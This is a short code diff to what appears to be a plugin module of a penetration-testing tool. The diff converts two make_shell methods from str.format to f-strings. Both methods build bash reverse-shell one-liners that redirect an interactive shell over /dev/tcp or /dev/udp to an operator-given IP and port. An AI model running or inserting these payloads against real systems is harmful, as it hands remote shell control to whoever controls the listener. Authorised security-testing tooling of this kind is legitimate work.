@@ -14,7 +14,7 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = "{} -i >& /dev/tcp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
+        self.shell = f"{self.args.shell} -i >& /dev/tcp/{self.args.ip}/{self.args.port} 0>&1"
 
 
 class ReverseUDP(plugin.ReverseShell):
@@ -31,4 +31,4 @@ class ReverseUDP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = "{} -i >& /dev/udp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
+        self.shell = f"{self.args.shell} -i >& /dev/udp/{self.args.ip}/{self.args.port} 0>&1"
